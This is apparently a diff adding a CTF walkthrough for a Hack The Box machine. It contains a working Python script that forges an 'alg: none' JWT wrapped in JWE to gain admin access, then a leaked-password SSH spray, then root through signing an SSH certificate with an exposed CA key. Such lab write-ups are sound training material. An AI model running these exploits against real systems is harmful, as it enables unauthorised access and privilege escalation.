@@ -1,0 +1,166 @@
+
+
+nmap -sC -sV 10.129.244.220
+
+echo "10.129.244.220  principal.htb principal" | sudo tee -a /etc/hosts
+
+
+getent hosts principal.htb
+cat /etc/hosts
+
+curl -s http://principal.htb:8080/api/auth/jwks | jq
+
+nano jwt.py
+
+#!/usr/bin/env python3
+import json, time, base64, requests, sys
+from jwcrypto import jwk, jwe
+
+TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://principal.htb:8080"
+
+# Fetch JWKS
+resp = requests.get(f"{TARGET}/api/auth/jwks")
+key_data = resp.json()['keys'][0]
+pub_key = jwk.JWK(**key_data)
+
+def b64url_encode(data):
+    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
+
+now = int(time.time())
+
+# Build PlainJWT - CRITICAL: separators without spaces + trailing dot
+header = b64url_encode(json.dumps(
+    {"alg": "none", "typ": "JWT"},
+    separators=(',', ':')
+).encode())
+
+payload = b64url_encode(json.dumps({
+    "sub": "admin",
+    "role": "ROLE_ADMIN",
+    "iss": "principal-platform",
+    "iat": now,
+    "exp": now + 3600
+}, separators=(',', ':')).encode())
+
+# Trailing dot represents the empty signature field
+plain_jwt = f"{header}.{payload}."
+
+# Wrap in JWE
+jwe_token = jwe.JWE(
+    plain_jwt.encode(),
+    recipient=pub_key,
+    protected=json.dumps({
+        "alg": "RSA-OAEP-256",
+        "enc": "A128GCM",
+        "kid": key_data['kid'],
+        "cty": "JWT"
+    })
+)
+forged_token = jwe_token.serialize(compact=True)
+
+# Test
+headers = {"Authorization": f"Bearer {forged_token}"}
+resp = requests.get(f"{TARGET}/api/dashboard", headers=headers)
+print(f"Status: {resp.status_code}")
+print(resp.text)
+
+with open("token.txt", "w") as f:
+    f.write(forged_token)
+print(f"\n[*] Token saved to token.txt")
+
+
+
+
+
+python3 -m venv ~/venv
+source ~/venv/bin/activate
+
+pip install jwcrypto requests
+
+python3 -c "import jwcrypto, requests; print('OK')"
+
+python3 jwt.py http://principal.htb:8080
+
+cat token.txt
+
+Open Firefox → http://principal.htb:8080
+
+
+F12 → click the Console tab
+
+sessionStorage.setItem('auth_token', 'PASTE_TOKEN_HERE');
+location.reload();
+
+
+cat > user.txt <<'EOF'
+admin
+svc-deploy
+jthompson
+amorales
+bwright
+kkumar
+mwilson
+lzhang
+EOF
+
+Step 2: Settings tab
+Click Settings in the sidebar. Find the encryptionKey value
+encryptionKey : D3pl0y_$$H_Now42!
+
+nxc ssh 10.129.244.220 -u user.txt -p 'D3pl0y_$$H_Now421'
+
+sudo apt install -y netexec
+
+ssh svc-deploy@10.129.244.220
+password : D3pl0y_$$H_Now42! (Don't Copy Paste type manually)
+
+id
+ls -la 
+cat user.txt 
+
+ls -la /opt/principal/ssh/
+cat /opt/principal/ssh/README.txt
+cat /etc/ssh/sshd_config.d/60-principal.conf
+
+ssh-keygen -t ed25519 -f /tmp/pwn -N ""
+
+
+ssh-keygen -s /opt/principal/ssh/ca \
+           -I "pwn-root" \
+           -n root \
+           -V +1h \
+           /tmp/pwn.pub
+           
+           
+ssh-keygen -L -f /tmp/pwn-cert.pub
+
+chmod 600 /tmp/pwn
+
+ssh -i /tmp/pwn root@localhost
+
+id
+cat /root/root.txt
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
